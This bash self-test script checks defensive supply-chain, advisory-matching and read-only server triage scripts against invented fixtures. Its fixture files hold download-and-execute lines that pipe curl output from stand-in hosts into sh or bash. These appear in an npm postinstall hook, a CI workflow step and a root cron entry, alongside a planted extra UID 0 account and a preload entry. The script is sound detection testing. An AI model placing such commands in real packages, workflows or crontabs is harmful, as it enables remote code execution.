#!/usr/bin/env bash
# selftest-threat-intel.sh - checks the threat-intelligence and triage scripts against controlled fixtures.
#
# Usage: selftest-threat-intel.sh
#
# Everything runs against a throwaway folder that this script creates and removes. The "advisories" and
# "malicious packages" in it are INVENTED FIXTURES (names start with fixture-/fx-), written only to prove that
# the scripts match, stay quiet, and fail safely. They are not real indicators, and a pass here says nothing about
# any live system: the VPS script is only exercised against a fake filesystem root, never a real host.
#
# Exit code: 0 all checks passed, 1 at least one failed.

set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
TMP="$(mktemp -d "${TMPDIR:-/tmp}/secresearcher-ti-selftest-XXXXXX")" || { echo "cannot create a temp folder" >&2; exit 1; }
trap 'rm -rf "$TMP"' EXIT

PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); echo "  ok   - $1"; }
bad() { FAIL=$((FAIL+1)); echo "  FAIL - $1"; }
check() { if [ "$3" -eq "$2" ]; then ok "$1 (exit $3)"; else bad "$1 (expected exit $2, got $3)"; fi; }
has()   { case "$2" in *"$3"*) ok "$1" ;; *) bad "$1 (missing: $3)" ;; esac; }
hasnt() { case "$2" in *"$3"*) bad "$1 (unexpectedly present: $3)" ;; *) ok "$1" ;; esac; }
valid_json() {
  if command -v node >/dev/null 2>&1; then
    if printf '%s' "$2" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{JSON.parse(s)}catch(e){process.exit(1)}})'; then ok "$1 is valid JSON"; else bad "$1 is not valid JSON"; fi
  else echo "  skip - $1 JSON validity (node not available)"; fi
}
NOW="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# ---- fixtures ---------------------------------------------------------------------------------------
BAD="$TMP/bad repo"; GOOD="$TMP/good-repo"
mkdir -p "$BAD/.github/workflows" "$BAD/node_modules/fx-evil" "$BAD/node_modules/fx-gyp" "$GOOD/node_modules/fx-gyp" "$GOOD/.github/workflows"

cat >"$BAD/package.json" <<'EOF'
{ "name": "fx-app", "version": "1.0.0",
  "scripts": { "postinstall": "node-gyp rebuild" },
  "dependencies": { "fixture-vuln-pkg": "1.2.0" } }
EOF
cat >"$BAD/package-lock.json" <<'EOF'
{
  "name": "fx-app", "lockfileVersion": 3,
  "packages": {
    "": { "name": "fx-app", "dependencies": { "fixture-vuln-pkg": "1.2.0" } },
    "node_modules/fixture-vuln-pkg": {
      "version": "1.2.0",
      "resolved": "https://registry.npmjs.org/fixture-vuln-pkg/-/fixture-vuln-pkg-1.2.0.tgz",
      "integrity": "sha512-AAAA"
    },
    "node_modules/@fx/scoped": {
      "version": "2.0.0",
      "resolved": "https://registry.npmjs.org/@fx/scoped/-/scoped-2.0.0.tgz",
      "integrity": "sha512-BBBB"
    },
    "node_modules/fixture-fixed-pkg": {
      "version": "1.4.2",
      "resolved": "https://registry.npmjs.org/fixture-fixed-pkg/-/fixture-fixed-pkg-1.4.2.tgz",
      "integrity": "sha512-CCCC"
    },
    "node_modules/fixture-beta-pkg": {
      "version": "3.0.0-beta.1",
      "resolved": "https://registry.npmjs.org/fixture-beta-pkg/-/fixture-beta-pkg-3.0.0-beta.1.tgz",
      "integrity": "sha512-DDDD"
    },
    "node_modules/fx-git-dep": {
      "version": "0.1.0",
      "resolved": "git+ssh://git@example.invalid/fx/fx-git-dep.git#abc123"
    }
  }
}
EOF
# an install script that downloads and runs code, and carries a token-looking string that must never be echoed
cat >"$BAD/node_modules/fx-evil/package.json" <<'EOF'
{ "name": "fx-evil", "version": "1.0.0",
  "scripts": { "postinstall": "curl -s http://fx.example.invalid/x.sh | sh # FAKETOKENFAKETOKENFAKETOKENFAKETOKEN12345" } }
EOF
cat >"$BAD/node_modules/fx-gyp/package.json" <<'EOF'
{ "name": "fx-gyp", "version": "1.0.0", "scripts": { "install": "node-gyp rebuild" } }
EOF
cat >"$BAD/.github/workflows/ci.yml" <<'EOF'
on:
  pull_request_target:
jobs:
  build:
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
      - uses: fx-org/fx-action@v1
      - uses: fx-org/pinned-action@0123456789abcdef0123456789abcdef01234567
      - run: echo "${{ github.event.pull_request.title }}"
      - run: curl -fsSL https://fx.example.invalid/i.sh | bash
EOF
cat >"$BAD/Dockerfile" <<'EOF'
FROM node:latest
FROM node:20@sha256:0000000000000000000000000000000000000000000000000000000000000000
RUN echo hi
EOF
cat >"$BAD/docker-compose.yml" <<'EOF'
services:
  web:
    image: nginx
EOF

# a benign repository: a normal build-script postinstall, pinned everything, registry sources, integrity hashes
cat >"$GOOD/package.json" <<'EOF'
{ "name": "fx-good", "version": "1.0.0", "scripts": { "install": "node-gyp rebuild" } }
EOF
cat >"$GOOD/package-lock.json" <<'EOF'
{ "name": "fx-good", "lockfileVersion": 3, "packages": {
  "": { "name": "fx-good" },
  "node_modules/safe-pkg": { "version": "3.0.0", "resolved": "https://registry.npmjs.org/safe-pkg/-/safe-pkg-3.0.0.tgz", "integrity": "sha512-EEEE" } } }
EOF
cp "$BAD/node_modules/fx-gyp/package.json" "$GOOD/node_modules/fx-gyp/package.json"
cat >"$GOOD/.github/workflows/ci.yml" <<'EOF'
on: [push]
jobs:
  t:
    steps:
      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567
EOF
printf 'FROM node:20@sha256:0000000000000000000000000000000000000000000000000000000000000000\n' >"$GOOD/Dockerfile"

# feeds (invented fixtures)
FEED="$TMP/feed-fresh.txt"; cat >"$FEED" <<EOF
# retrieved: $NOW
# fixture feed: invented records for self-test only
npm|fixture-vuln-pkg|>=1.0.0,<1.4.2|FX-GHSA-0001|2026-01-01|https://example.invalid/fx1|fixture advisory
npm|@fx/scoped|=2.0.0|FX-GHSA-0002|2026-01-02|https://example.invalid/fx2|scoped package fixture
npm|fixture-fixed-pkg|<1.4.2|FX-GHSA-0003|2026-01-03|https://example.invalid/fx3|fixed in 1.4.2, so 1.4.2 must NOT match
npm|fixture-beta-pkg|<3.0.0|FX-GHSA-0004|2026-01-04|https://example.invalid/fx4|pre-release version: must be POTENTIAL
npm|some-other-pkg|<9.9.9|FX-GHSA-0005|2026-01-05|https://example.invalid/fx5|not installed anywhere
bogus line without enough fields
EOF
FEED_NOMATCH="$TMP/feed-nomatch.txt"; printf '# retrieved: %s\nnpm|some-other-pkg|<9.9.9|FX-1|2026-01-05|https://example.invalid|x\n' "$NOW" >"$FEED_NOMATCH"
FEED_STALE="$TMP/feed-stale.txt"; sed 's/^# retrieved: .*/# retrieved: 2020-01-01T00:00:00Z/' "$FEED_NOMATCH" >"$FEED_STALE"
FEED_NODATE="$TMP/feed-nodate.txt"; grep -v retrieved "$FEED_NOMATCH" >"$FEED_NODATE"
FEED_FUTURE="$TMP/feed-future.txt"; sed 's/^# retrieved: .*/# retrieved: 2999-01-01T00:00:00Z/' "$FEED_NOMATCH" >"$FEED_FUTURE"
FEED_EMPTY="$TMP/feed-empty.txt"; printf '# retrieved: %s\n' "$NOW" >"$FEED_EMPTY"
snapshot() { (cd "$1" && find . -type f | sort | xargs -I{} cksum "{}" 2>/dev/null | tr '\n' ' '); }
SNAP_BAD="$(snapshot "$BAD")"; SNAP_GOOD="$(snapshot "$GOOD")"

echo "1. syntax and help"
for f in check-runtime-inventory.sh check-dependency-advisories.sh check-supply-chain-indicators.sh vps-readonly-triage.sh selftest-threat-intel.sh; do
  bash -n "$HERE/$f" 2>/dev/null; check "bash -n $f" 0 $?
  case "$f" in selftest*) ;; *) bash "$HERE/$f" --help >/dev/null 2>&1; check "$f --help" 0 $? ;; esac
done

echo "2. check-runtime-inventory.sh"
OUT="$(bash "$HERE/check-runtime-inventory.sh" --path "$BAD" 2>&1)"; check "inventory of the fixture" 0 $?
has "reads the Dockerfile base image" "$OUT" "node:latest"
has "flags a floating :latest base" "$OUT" "floating-latest"
has "flags a digest-pinned base" "$OUT" "digest-pinned"
has "flags a compose image without a tag" "$OUT" "no-tag(floating)"
has "lists the lockfile" "$OUT" "package-lock.json"
JSON_OUT="$(bash "$HERE/check-runtime-inventory.sh" --path "$BAD" --json 2>/dev/null)"; valid_json "inventory --json" "$JSON_OUT"
EMPTY="$TMP/empty dir"; mkdir -p "$EMPTY"
OUT="$(SECRESEARCHER_DISABLE_TOOLS="node npm pnpm yarn bun python3 pip3 php composer go ruby java docker git" bash "$HERE/check-runtime-inventory.sh" --path "$EMPTY" 2>&1)"; rc=$?
# uname/os rows are always "ok", so coverage of the host is still present; missing tools must be labelled not-installed
has "missing tools are labelled, not hidden" "$OUT" "not-installed"
has "an empty folder says so" "$OUT" "no manifests, lockfiles or Dockerfiles"
bash "$HERE/check-runtime-inventory.sh" --path "$TMP/nope" >/dev/null 2>&1; check "missing path" 2 $?
bash "$HERE/check-runtime-inventory.sh" --bogus >/dev/null 2>&1; check "unknown option" 2 $?

echo "3. check-dependency-advisories.sh"
OUT="$(bash "$HERE/check-dependency-advisories.sh" --feed "$FEED" --path "$BAD" 2>&1)"; check "matching feed gives findings" 10 $?
has "matches the vulnerable range" "$OUT" "MATCH   fixture-vuln-pkg@1.2.0"
has "matches a scoped package" "$OUT" "@fx/scoped@2.0.0"
hasnt "does not match the fixed version" "$OUT" "fixture-fixed-pkg@1.4.2  advisory"
has "pre-release versions are POTENTIAL, not MATCH" "$OUT" "POTENTIAL fixture-beta-pkg@3.0.0-beta.1"
has "reports the advisory id and source" "$OUT" "FX-GHSA-0001"
has "reports malformed feed lines as a gap" "$OUT" "malformed"
OUT="$(bash "$HERE/check-dependency-advisories.sh" --feed "$FEED_NOMATCH" --path "$GOOD" 2>&1)"; check "fresh feed, no match, full coverage" 0 $?
has "says no match is not proof" "$OUT" "not proof of safety"
OUT="$(bash "$HERE/check-dependency-advisories.sh" --feed "$FEED_STALE" --path "$GOOD" 2>&1)"; check "stale feed is incomplete, not clean" 20 $?
has "names the stale feed" "$OUT" "STALE"
OUT="$(bash "$HERE/check-dependency-advisories.sh" --feed "$FEED_NODATE" --path "$GOOD" 2>&1)"; check "undated feed is incomplete" 20 $?
OUT="$(bash "$HERE/check-dependency-advisories.sh" --feed "$FEED_FUTURE" --path "$GOOD" 2>&1)"; check "future-dated feed is incomplete" 20 $?
OUT="$(bash "$HERE/check-dependency-advisories.sh" --feed "$FEED_EMPTY" --path "$GOOD" 2>&1)"; check "empty feed is incomplete" 20 $?
OUT="$(bash "$HERE/check-dependency-advisories.sh" --feed "$FEED_NOMATCH" --path "$EMPTY" 2>&1)"; check "no lockfile is incomplete" 20 $?
has "says no lockfile was found" "$OUT" "no supported lockfile"
bash "$HERE/check-dependency-advisories.sh" --feed "$FEED_STALE" --path "$BAD" >/dev/null 2>&1; check "stale feed does not hide a match..." 20 $?
STALE_MATCH="$TMP/feed-stale-match.txt"; sed 's/^# retrieved: .*/# retrieved: 2020-01-01T00:00:00Z/' "$FEED" >"$STALE_MATCH"
bash "$HERE/check-dependency-advisories.sh" --feed "$STALE_MATCH" --path "$BAD" >/dev/null 2>&1; check "...a match in a stale feed still reports findings" 10 $?
bash "$HERE/check-dependency-advisories.sh" --path "$GOOD" >/dev/null 2>&1; check "missing --feed" 2 $?
bash "$HERE/check-dependency-advisories.sh" --feed "$TMP/nope.txt" --path "$GOOD" >/dev/null 2>&1; check "unreadable feed" 2 $?
bash "$HERE/check-dependency-advisories.sh" --feed "$FEED" --max-age-days 0 >/dev/null 2>&1; check "max-age 0 rejected" 2 $?
bash "$HERE/check-dependency-advisories.sh" --feed "$FEED" --max-age-days abc >/dev/null 2>&1; check "non-numeric max-age rejected" 2 $?
# pnpm, yarn v1 and requirements parsing
PN="$TMP/pnpm repo"; mkdir -p "$PN"
printf "lockfileVersion: '9.0'\npackages:\n  fixture-vuln-pkg@1.2.0:\n    resolution: {integrity: sha512-x}\n  '@fx/scoped@2.0.0':\n    resolution: {integrity: sha512-y}\n" >"$PN/pnpm-lock.yaml"
printf '# yarn lockfile v1\n\nfixture-vuln-pkg@^1.0.0:\n  version "1.2.0"\n  resolved "https://registry.yarnpkg.com/x"\n' >"$PN/yarn.lock"
printf 'Fixture_Vuln_Pkg==1.2.0\nother>=1.0\n' >"$PN/requirements.txt"
PYFEED="$TMP/feed-py.txt"; printf '# retrieved: %s\nnpm|fixture-vuln-pkg|<1.4.2|FX-N|2026-01-01|https://example.invalid|x\nnpm|@fx/scoped|=2.0.0|FX-S|2026-01-01|https://example.invalid|x\npypi|fixture-vuln-pkg|=1.2.0|FX-P|2026-01-01|https://example.invalid|x\n' "$NOW" >"$PYFEED"
OUT="$(bash "$HERE/check-dependency-advisories.sh" --feed "$PYFEED" --path "$PN" 2>&1)"; check "pnpm, yarn v1 and pip lockfiles" 10 $?
has "pnpm scoped package parsed" "$OUT" "@fx/scoped@2.0.0 in pnpm-lock.yaml"
has "yarn v1 parsed" "$OUT" "in yarn.lock"
has "pip name normalised and matched" "$OUT" "advisory=FX-P"
has "unpinned requirement is reported as a gap" "$OUT" "unpinned requirements"

echo "4. check-supply-chain-indicators.sh"
OUT="$(bash "$HERE/check-supply-chain-indicators.sh" --path "$BAD" 2>&1)"; check "hostile fixture is flagged" 10 $?
has "download-and-execute install script" "$OUT" "download-and-execute"
has "locates it in the installed package" "$OUT" "node_modules/fx-evil/package.json"
hasnt "never echoes the token-looking string" "$OUT" "FAKETOKENFAKETOKEN"
has "unpinned third-party action" "$OUT" "workflow-unpinned-action"
has "pull_request_target" "$OUT" "workflow-pull-request-target"
has "expression injection" "$OUT" "workflow-expression-injection"
has "workflow download-and-execute" "$OUT" "workflow-download-and-execute"
has "floating image" "$OUT" "image-floating"
has "non-registry lockfile source" "$OUT" "lockfile-source"
has "missing integrity" "$OUT" "lockfile-integrity"
has "benign node-gyp script is only context" "$OUT" "INFO	lifecycle-script"
[ "$(printf '%s
' "$OUT" | grep -c "workflow-unpinned-action")" = "2" ] && ok "exactly the two mutable-ref actions are reported (SHA-pinned one is not)" || bad "unexpected unpinned-action count"
hasnt "first-party actions/ ref is context, not review" "$OUT" "REVIEW	workflow-unpinned-action	.github/workflows/ci.yml:8"
has "states that no indicators is not proof" "$OUT" "does not prove"
OUT="$(bash "$HERE/check-supply-chain-indicators.sh" --path "$GOOD" 2>&1)"; check "benign fixture is not flagged (false-positive control)" 0 $?
hasnt "no INDICATOR on node-gyp rebuild" "$OUT" "INDICATOR"
has "the lifecycle script is still reported as context" "$OUT" "node-gyp rebuild"
bash "$HERE/check-supply-chain-indicators.sh" --path "$BAD" --fail-on none >/dev/null 2>&1; check "--fail-on none keeps findings out of the exit code" 0 $?
NOM="$TMP/no-modules"; mkdir -p "$NOM"; cp "$GOOD/package.json" "$GOOD/package-lock.json" "$NOM/"
OUT="$(bash "$HERE/check-supply-chain-indicators.sh" --path "$NOM" 2>&1)"; check "missing node_modules is a coverage gap, not a pass" 20 $?
has "names the gap" "$OUT" "GAP"
bash "$HERE/check-supply-chain-indicators.sh" --path "$EMPTY" >/dev/null 2>&1; check "nothing recognisable is incomplete" 20 $?
GITR="$TMP/git-repo"; mkdir -p "$GITR/.git"; cp "$GOOD/package.json" "$GOOD/package-lock.json" "$GITR/"; mkdir -p "$GITR/node_modules/fx-gyp"; cp "$GOOD/node_modules/fx-gyp/package.json" "$GITR/node_modules/fx-gyp/"
OUT="$(SECRESEARCHER_DISABLE_TOOLS="git" bash "$HERE/check-supply-chain-indicators.sh" --path "$GITR" 2>&1)"; check "git missing is a coverage gap" 20 $?
has "says git history was not checked" "$OUT" "NOT checked"
bash "$HERE/check-supply-chain-indicators.sh" --path "$GOOD" --fail-on sometimes >/dev/null 2>&1; check "invalid --fail-on" 2 $?
bash "$HERE/check-supply-chain-indicators.sh" --path "$TMP/nope" >/dev/null 2>&1; check "missing path" 2 $?
[ "$(snapshot "$BAD")" = "$SNAP_BAD" ] && [ "$(snapshot "$GOOD")" = "$SNAP_GOOD" ] && ok "scanned repositories were not modified" || bad "a scanned fixture changed"

echo "5. vps-readonly-triage.sh (fake filesystem root only; NOT a live host)"
RT="$TMP/fakeroot"; mkdir -p "$RT/etc" "$RT/tmp" "$RT/var/log" "$RT/home/deploy/.ssh" "$RT/srv/app" "$RT/etc/cron.d"
printf 'root:x:0:0:root:/root:/bin/bash\ndeploy:x:1000:1000::/home/deploy:/bin/bash\nfxadmin:x:0:0::/home/fxadmin:/bin/bash\n' >"$RT/etc/passwd"
printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5FAKEKEYMATERIALFAKEKEYMATERIAL1234567890 fixture\n' >"$RT/home/deploy/.ssh/authorized_keys"
printf '#!/bin/sh\necho fixture\n' >"$RT/tmp/fx-dropper"; chmod +x "$RT/tmp/fx-dropper"
printf '/lib/fx-preload.so\n' >"$RT/etc/ld.so.preload"
printf '* * * * * root curl http://fx.example.invalid/a | sh\n' >"$RT/etc/cron.d/fx"
printf 'Jan  1 00:00:01 h sshd[1]: Accepted password for root from 192.0.2.1 port 22 ssh2\nJan 1 00:00:02 h sshd[1]: Failed password for x from 192.0.2.9 port 22\n' >"$RT/var/log/auth.log"
printf 'SECRETVALUE=hunter2-fixture\n' >"$RT/srv/app/.env"; chmod 666 "$RT/srv/app/.env" 2>/dev/null
RT_SNAP="$(snapshot "$RT")"
bash "$HERE/vps-readonly-triage.sh" --root "$RT" >/dev/null 2>&1; check "refuses without --authorized" 2 $?
bash "$HERE/vps-readonly-triage.sh" --authorized --root "$TMP/nope" >/dev/null 2>&1; check "bad --root" 2 $?
bash "$HERE/vps-readonly-triage.sh" --authorized --root "$RT" --days 0 >/dev/null 2>&1; check "bad --days" 2 $?
bash "$HERE/vps-readonly-triage.sh" --authorized --root "$RT" --out "$TMP/not-created" >/dev/null 2>&1; check "--out must already exist" 2 $?
bash "$HERE/vps-readonly-triage.sh" --authorized --root "$RT" --app-dir /srv/missing >/dev/null 2>&1; check "bad --app-dir" 2 $?
mkdir -p "$TMP/vout"
OUT="$(bash "$HERE/vps-readonly-triage.sh" --authorized --root "$RT" --app-dir /srv/app --out "$TMP/vout" 2>&1)"; check "leads found in the fake root" 10 $?
has "extra UID 0 account" "$OUT" "additional UID 0 account"
has "executable in /tmp" "$OUT" "executable file(s) in /tmp"
has "ld.so.preload" "$OUT" "ld.so.preload"
has "cron download-and-run" "$OUT" "cron entry downloads"
has "root password login" "$OUT" "password login for root"
hasnt "never prints key material" "$OUT" "FAKEKEYMATERIAL"
hasnt "never prints .env contents" "$OUT" "hunter2"
has "says the root is a fixture, not a live system" "$OUT" "not a live system"
has "command sections are skipped, not passed" "$OUT" "[skipped]"
[ -f "$(ls "$TMP"/vout/vps-triage-*.txt 2>/dev/null | head -n 1)" ] && ok "--out wrote a new report file" || bad "--out did not write a file"
has "records a hash of the saved report" "$OUT" "sha256="
CLEANRT="$TMP/cleanroot"; mkdir -p "$CLEANRT/etc" "$CLEANRT/tmp"; printf 'root:x:0:0:root:/root:/bin/bash\n' >"$CLEANRT/etc/passwd"
OUT="$(bash "$HERE/vps-readonly-triage.sh" --authorized --root "$CLEANRT" 2>&1)"; rc=$?
if [ "$rc" -eq 20 ]; then ok "a quiet fake root is INCOMPLETE (exit 20), never clean"; else bad "a quiet fake root must exit 20, got $rc"; fi
has "does not claim the host is clean" "$OUT" "not a clean result"
[ "$(snapshot "$RT")" = "$RT_SNAP" ] && ok "the fake root was not modified" || bad "the fake root changed"

echo
echo "passed: $PASS  failed: $FAIL"
[ "$FAIL" -eq 0 ]
